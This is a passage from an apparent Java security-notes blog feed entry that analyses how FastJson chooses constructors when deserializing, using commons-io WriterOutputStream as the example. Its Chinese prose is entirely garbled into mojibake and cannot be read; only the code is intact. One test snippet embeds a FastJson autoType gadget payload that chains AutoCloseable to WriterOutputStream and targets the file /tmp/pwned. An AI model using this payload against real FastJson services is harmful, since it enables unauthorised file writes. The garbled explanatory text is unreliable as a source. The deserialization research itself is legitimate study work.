å‡½æ•°</p><h2 id="å­˜åœ¨æœ‰å‚æ„é€ å‡½æ•°">å­˜åœ¨æœ‰å‚æ„é€ å‡½æ•°</h2><p>æˆ‘ä»¬å¯¹ä¸Šè¾¹çš„noConstructorç±»å¢åŠ ä¸€ä¸ªæœ‰å‚æ„é€ å‡½æ•°ï¼Œå†æ‰§è¡Œè¯¥ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.main.fastjsonconstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">noConstructor</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String student;</span><br><span class="line">    <span class="keyword">public</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">noConstructor</span><span class="params">(String name,String id)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStudent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudent</span><span class="params">(String student)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.student = student;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&#x27;&quot;</span> + id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, student=&#x27;&quot;</span> + student + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;123\&quot;,\&quot;student\&quot;:\&quot;aaa\&quot;,\&quot;id\&quot;:\&quot;456\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">noConstructor</span> <span class="variable">no</span> <span class="operator">=</span> JSON.parseObject(payload, noConstructor.class);</span><br><span class="line">        System.out.println(no);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User<span class="punctuation">&#123;</span>name=&#x27;<span class="number">123</span>&#x27;<span class="punctuation">,</span> id=&#x27;<span class="number">456</span>&#x27;<span class="punctuation">,</span> student=&#x27;<span class="literal"><span class="keyword">null</span></span>&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œè°ƒç”¨äº†æœ‰å‚æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”å¹¶æ²¡æœ‰ç»™studentèµ‹å€¼ï¼Œå½“æˆ‘ä»¬æ‰‹åŠ¨ä¸ºç±»æ·»åŠ æœ‰å‚æ„é€ å‡½æ•°æ—¶å€™ï¼Œåœ¨ç¼–è¯‘å™¨ç¼–è¯‘æ—¶ï¼Œå°±ä¸ä¼šå†ä¸ºå…¶æ·»åŠ æ— å‚æ„é€ å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ çš„ç±»æœ‰ä¸”åªæœ‰ä½ æ·»åŠ çš„è¿™ä¸ªæ„é€ å‡½æ•°ã€‚é‚£è¿™æ ·FastJsonæ˜¯å¦‚ä½•ååºåˆ—åŒ–ç”Ÿæˆå®ä¾‹çš„å‘¢ï¼Ÿ</p><h2 id="è°ƒç”¨åˆ†æ">è°ƒç”¨åˆ†æ</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410160331290.png" alt="image-20240410160331290"></p><p>è¿™æ¬¡è¦è®²çš„é‡ç‚¹åœ¨JavaBeanInfoçš„buildæ–¹æ³•ä¸­ã€‚ä»ç±»åä¸­å¤§å¥–å¯ä»¥çŸ¥é“ï¼Œè¿™æ˜¯FastJsonå†…éƒ¨å­˜å‚¨ååºåˆ—åŒ–å¯¹è±¡ä¿¡æ¯çš„ç±»ã€‚è¿™å…¶ä¸­å°±åŒ…å«äº†åˆ›å»ºè¯¥ç±»çš„æ„é€ æ–¹æ³•ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Constructor&lt;?&gt; getDefaultConstructor(Class&lt;?&gt; clazz, <span class="keyword">final</span> Constructor&lt;?&gt;[] constructors) &#123;</span><br><span class="line">       <span class="keyword">if</span> (Modifier.isAbstract(clazz.getModifiers())) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       Constructor&lt;?&gt; defaultConstructor = <span class="literal">null</span>;</span><br><span class="line">       <span class="comment">//è¿™é‡Œå¾ˆå¥½ç†è§£ å…ˆéå†ä¸‹æ‰€æœ‰çš„æ„é€ å‡½æ•°ï¼Œæ‰¾åˆ°å…¶ä¸­æ— å‚æ„é€ å‡½æ•°</span></span><br><span class="line">       <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : constructors) &#123;</span><br><span class="line">           <span class="keyword">if</span> (constructor.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">               defaultConstructor = constructor;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (defaultConstructor == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) &#123;</span><br><span class="line">               Class&lt;?&gt;[] types;</span><br><span class="line">               <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : constructors) &#123;</span><br><span class="line">                   <span class="keyword">if</span> ((types = constructor.getParameterTypes()).length == <span class="number">1</span></span><br><span class="line">                           &amp;&amp; types[<span class="number">0</span>].equals(clazz.getDeclaringClass())) &#123;</span><br><span class="line">                       defaultConstructor = constructor;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> defaultConstructor;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨æ— å‚æ„é€ å‡½æ•°è¿›è¡Œååºåˆ—åŒ–</p><p>ä»è°ƒè¯•çŠ¶æ€çš„ä¿¡æ¯å¯ä»¥çœ‹åˆ°é»˜è®¤æ„é€ å‡½æ•°æ˜¯æ— å‚æ„é€ å‡½æ•°ï¼Œé»˜è®¤æ„é€ å‡½æ•°çš„å‚æ•°é•¿åº¦ä¸º0ä¸ªã€‚</p><p>ä¸‹é¢æ˜¯æœ‰å‚æ„é€ å‡½æ•°çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">is_public</span> <span class="operator">=</span> (constructor.getModifiers() &amp; Modifier.PUBLIC) != <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_public) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å‰é¢çš„æ–¹æ³•éƒ½æ˜¯è¿›è¡Œä¸€äº›è¿‡æ»¤ ä¸‹é¢çš„æ‰æ˜¯è·å–æ‰‹åŠ¨æœ‰å‚æ„é€ å‡½æ•°çš„å…³é”®ã€‚</span></span><br><span class="line"><span class="comment">//é¦–å…ˆä¼šè·å–æ„é€ å‡½æ•°çš„å‚æ•°åç§°åˆ—è¡¨ å¦‚æœå‚æ•°åˆ—è¡¨ä¸ºç©ºæˆ–è€…é•¿åº¦ä¸º0 åˆ™æ”¾å¼ƒè¯¥æ–¹æ³•ï¼Œå¼€å§‹ä¸‹ä¸€æ¬¡å¾ªç¯</span></span><br><span class="line"><span class="comment">//è¿™é‡Œçš„è·å–å‚æ•°åç§°ä½¿ç”¨çš„å¹¶ä¸æ˜¯java8ä¸­æä¾›çš„è·å–æ–¹æ³•å‚æ•°åç§°çš„æ–¹å¼</span></span><br><span class="line"><span class="comment">//è€Œæ˜¯é€šè¿‡æµè¯»å–classæ–‡ä»¶çš„çš„æ–¹å¼æ¥è·å–çš„</span></span><br><span class="line">String[] lookupParameterNames = ASMUtils.lookupParameterNames(constructor);</span><br><span class="line"><span class="keyword">if</span> (lookupParameterNames == <span class="literal">null</span> || lookupParameterNames.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸‹é¢è¿™æ®µæ–¹æ³•å¾ˆæ˜¾ç„¶å°±æ˜¯åœ¨æ¯”è¾ƒå¹¶äº¤æ¢ï¼Œå¦‚æœè¯¥æœ‰å‚æ„é€ å‡½æ•°çš„å‚æ•°ä¸ªæ•°å¤§äºä¹‹å‰çš„æ„é€ æ–¹æ³•ä¸­</span></span><br><span class="line"><span class="comment">//å‚æ•°ä¸ªæ•°æœ€å¤šçš„æ„é€ æ–¹æ³•ï¼Œåˆ™ç”¨è¿™ä¸ªæ„é€ æ–¹æ³•å’Œå‚æ•°åç§°æ•°ç»„æ›¿æ¢ä¹‹å‰ä¿å­˜çš„æ„é€ æ–¹æ³•å’Œå‚æ•°åç§°æ•°ç»„</span></span><br><span class="line"><span class="keyword">if</span> (creatorConstructor != <span class="literal">null</span>&amp;&amp; paramNames != <span class="literal">null</span> &amp;&amp; lookupParameterNames.length &lt;= paramNames.length) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ–¹æ³•çš„ä½œç”¨æ˜¯ä»æ‰€æœ‰çš„æ„é€ æ–¹æ³•ä¸­è·å–å‚æ•°æœ€å¤šçš„ä¸€ä¸ªï¼Œå¹¶å°†å…¶æ”¾å…¥JaveBeanInfoçš„creatorConstructorå±æ€§ä¸­ï¼Œä¾›åé¢å®ä¾‹åŒ–å¯¹è±¡ä½¿ç”¨ã€‚è¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œçš„è·å–å‚æ•°åç§°ä½¿ç”¨çš„å¹¶ä¸æ˜¯java8ä¸­æä¾›çš„è·å–æ–¹æ³•å‚æ•°åç§°çš„æ–¹å¼ï¼Œè€Œæ˜¯é€šè¿‡æµè¯»å–classæ–‡ä»¶çš„çš„æ–¹å¼æ¥è·å–çš„ã€‚åœ¨èµ‹å€¼çš„æ—¶å€™ï¼Œä¼šé€šè¿‡å‚æ•°åç§°å»jsonä¸²ä¸­æŸ¥æ‰¾å¯¹åº”åç§°çš„å­—æ®µæ¥èµ‹å€¼ï¼Œå¹¶ä¸”åœ¨é€šè¿‡æ„é€ å‡½æ•°èµ‹å€¼å®Œæ¯•ä¹‹åï¼Œå°†ä¸å†é€šè¿‡setæ–¹æ³•èµ‹å€¼ï¼ˆè¿™é‡Œæœ‰å‘ä¸€å®šè¦è®°ä½ï¼Œå¦åˆ™ä¼šå‡ºç°èµ‹å€¼ä¸ä¸Šçš„è«åå…¶å¦™çš„é”™è¯¯ï¼‰ã€‚</p><h2 id="è°ƒç”¨æµç¨‹å›¾">è°ƒç”¨æµç¨‹å›¾</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410161751148.png" alt="image-20240410161751148"></p><h2 id="å­˜åœ¨å¤šä¸ªå‚æ•°æ•°é‡ç›¸åŒçš„æ„é€ å‡½æ•°ï¼ˆè°ƒç”¨éšæœºæ€§ï¼‰">å­˜åœ¨å¤šä¸ªå‚æ•°æ•°é‡ç›¸åŒçš„æ„é€ å‡½æ•°ï¼ˆè°ƒç”¨éšæœºæ€§ï¼‰</h2><p>è¯•éªŒç¯å¢ƒjdk8u271 commons-io2.4</p><p>è¿™é‡Œå°±ä»¥org.apache.commons.io.output.WriterOutputStreamç±»ä¸ºä¾‹è¿›è¡Œåˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, CharsetDecoder decoder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, (CharsetDecoder)decoder, <span class="number">1024</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, CharsetDecoder decoder, <span class="type">int</span> bufferSize, <span class="type">boolean</span> writeImmediately)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decoderIn = ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">this</span>.writer = writer;</span><br><span class="line">        <span class="built_in">this</span>.decoder = decoder;</span><br><span class="line">        <span class="built_in">this</span>.writeImmediately = writeImmediately;</span><br><span class="line">        <span class="built_in">this</span>.decoderOut = CharBuffer.allocate(bufferSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, Charset charset, <span class="type">int</span> bufferSize, <span class="type">boolean</span> writeImmediately)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, charset.newDecoder().onMalformedInput(CodingErrorAction.REPLACE).onUnmappableCharacter(CodingErrorAction.REPLACE).replaceWith(<span class="string">&quot;?&quot;</span>), bufferSize, writeImmediately);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, Charset charset)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, (Charset)charset, <span class="number">1024</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, String charsetName, <span class="type">int</span> bufferSize, <span class="type">boolean</span> writeImmediately)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, Charset.forName(charsetName), bufferSize, writeImmediately);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, String charsetName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, (String)charsetName, <span class="number">1024</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, (Charset)Charset.defaultCharset(), <span class="number">1024</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å°±æ˜¯è¯¥ç±»çš„æ„é€ å‡½æ•°ï¼Œè¶³è¶³æœ‰ä¸ƒä¸ªï¼ŒæŒ‰ç…§ä¸Šé¢çš„åˆ†æï¼Œè¿™é‡Œåº”è¯¥ä¼šè°ƒç”¨å‚æ•°æœ€å¤šçš„æ„é€ å‡½æ•°ï¼Œä½†å‚æ•°æœ€å¤šï¼ˆå››ä¸ªï¼‰æ„é€ å‡½æ•°æœ‰ä¸¤ä¸ªï¼Œè¿™ç©¶ç«Ÿä¼šè°ƒç”¨å“ªä¸ªå‘¢ï¼Ÿ</p><p>è¿™é‡Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›fjçš„JavaBeanInfoç±»çš„æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookupParameterNames.length &gt; paramNames.length</span><br></pre></td></tr></table></figure><p>åˆšåˆšå·²ç»è¯´è¿‡ï¼Œè¿™ä¸ªä½ç½®æ˜¯åˆ¤æ–­æ„é€ å‡½æ•°çš„å‚æ•°æ•°é‡çš„ï¼Œæˆ‘ä»¬å¾€å›æ‰¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410162101563.png" alt="image-20240410162101563"></p><p>å°±åœ¨æ­£ä¸Šæ–¹å°±æ‰¾åˆ°äº†è¿™ä¸ªconstructorï¼Œçœ‹åå­—å¤§è‡´å°±å¯ä»¥æ‰å‡ºæ¥è¿™ä¸ªåº”è¯¥å°±æ˜¯æˆ‘ä»¬çš„æœ‰å‚æ„é€ å‡½æ•°ï¼Œé‚£è¿™ä¸ªconstructoræ˜¯æ€ä¹ˆæ¥çš„ï¼Ÿæˆ‘ä»¬å‘ä¸Šåˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410162323007.png" alt="image-20240410162323007"></p><p>ä¸éš¾æ‰¾åˆ°å¦‚ä¸Šä»£ç ç‰‡æ®µï¼Œè¿™é‡Œå¾ªç¯ä»0å°†è·å¾—çš„var21èµ‹å€¼ç»™constructorï¼ŒçŒœæµ‹è¿™é‡Œçš„var21åº”è¯¥æ˜¯æ„é€ å‡½æ•°æ•°ç»„ï¼Œæˆ‘ä»¬ç»§ç»­å‘ä¸Šåˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410162507466.png" alt="image-20240410162507466"></p><p>å°±åœ¨ä¸Šæ–¹ï¼ŒåŸºæœ¬å¯ä»¥ç¡®è®¤ä¸ºæ„é€ å‡½æ•°æ•°ç»„ï¼Œç»§ç»­è·Ÿè¸ª</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410162558949.png" alt="image-20240410162558949"></p><p>å¯ä»¥å‘ç°åœ¨289è¡Œï¼Œåˆ©ç”¨getDeclaredConstructors()è·å–äº†clazzçš„æ‰€æœ‰æ„é€ å‡½æ•°ï¼Œè¿™é‡Œçš„clazzå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ç±»ï¼Œä½†è¿™é‡Œå°±å‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯getDeclaredConstructorsè¿™ä¸ªå‡½æ•°çš„è·å–éšæœºæ€§ï¼Œè¿™é‡Œä»…ä»…æ˜¯æˆ‘ä¸ªäººçš„è§è§£ï¼Œæš‚æ—¶å¹¶æ²¡æœ‰å»æ‰¾å…¶ä»–æ–‡ç« ä½œä¸ºç†è®ºæ”¯æ’‘ï¼Œæˆ‘ä»¬ç”¨ä¸‹é¢çš„ä»£ç è¿›è¡Œæµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;file\&quot;:\&quot;/tmp/pwned\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;charset\&quot;:\&quot;UTF-8\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;append\&quot;: false&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>);</span><br><span class="line">        Constructor[] constructor = c.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; constructor.length; i++) &#123;</span><br><span class="line">            System.out.println(constructor[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410163311035.png" alt="image-20240410163311035"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410163326104.png" alt="image-20240410163326104"></p><p>å‘ç°å‡ºç°äº†ä¸¤ç§è¿è¡Œç»“æœï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿç®€å•è¯´ä¸‹æµ‹è¯•ä»£ç ï¼Œåˆ©ç”¨åå°„è·å–äº†å…¶æ‰€æœ‰æ„é€ å‡½æ•°ï¼Œç„¶åå¾ªç¯è¾“å‡ºã€‚</p><p>æˆ‘ä»¬è§‚å¯Ÿæ§åˆ¶å°çš„è¾“å‡ºç»“æœï¼Œä¸éš¾å‘ç°è¾“å‡ºçš„é¡ºåºç«Ÿç„¶æœ‰æ‰€ä¸åŒï¼Œè¿™å°±æ˜¯æˆ‘æ‰€è¯´çš„è°ƒç”¨çš„éšæœºæ€§ï¼Œæˆ‘ä»¬å†å›åˆ°ä¸Šé¢æ‰€è¯´çš„å¯¹äºå‚æ•°æ•°é‡çš„åˆ¤æ–­éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lookupParameterNames != <span class="literal">null</span> &amp;&amp; lookupParameterNames.length != <span class="number">0</span> &amp;&amp; (creatorConstructor == <span class="literal">null</span> || paramNames == <span class="literal">null</span> || lookupParameterNames.length &gt; paramNames.length)) &#123;</span><br><span class="line">                                            paramNames = lookupParameterNames;</span><br><span class="line">                                            creatorConstructor = constructor;</span><br><span class="line">                                        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„lookupParameterNameså°±æ˜¯æˆ‘ä»¬æ­£åœ¨åˆ¤æ–­çš„æ„é€ å‡½æ•°çš„å‚æ•°ï¼ŒparamNamesæ˜¯å·²ç»å­˜åœ¨çš„æ„é€ å‡½æ•°çš„åˆ¤æ–­ï¼Œç”±æ­¤å¯å¾—ï¼Œå¦‚æœæˆ‘ä»¬ç°åœ¨ä¼ å…¥çš„æ„é€ å‡½æ•°çš„å‚æ•°æ•°é‡å¤§äºå·²çŸ¥çš„æœ€å¤§ï¼ˆåˆå§‹ä¸º0ï¼‰çš„æ„é€ å‡½æ•°çš„å‚æ•°æ•°é‡ï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡Œæ„é€ å‡½æ•°çš„è¦†ç›–ã€‚ç”±äºgetDeclaredConstructorså‡½æ•°è·å–çš„æ„é€ å‚æ•°é¡ºåºä¸åŒï¼Œå‡è®¾å…¶ä¸¤ä¸ªæ„é€ å‡½æ•°ä¸ºc1å’Œc2ï¼Œå¦‚æœè·å–çš„é¡ºåºä¸ºc1åœ¨å‰ï¼Œé‚£ä¹ˆåœ¨c2è¿›å…¥åˆ¤æ–­çš„æ—¶å€™ï¼Œç”±äºå’Œc1çš„å‚æ•°æ•°é‡ç›¸ç­‰ï¼Œæ‰€ä»¥å°±ä¸ä¼šè¿›è¡Œè¦†ç›–æ“ä½œã€‚æ‰€ä»¥ï¼Œå½“å­˜åœ¨å¤šä¸ªå‚æ•°æ•°é‡ç›¸åŒçš„æ„é€ å‡½æ•°æ—¶ï¼Œfjä¼šå§‹ç»ˆè°ƒç”¨æœ€å¼€å§‹ä¼ å…¥çš„é‚£ä¸ªæ„é€ å‡½æ•°ã€‚</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
</feed>
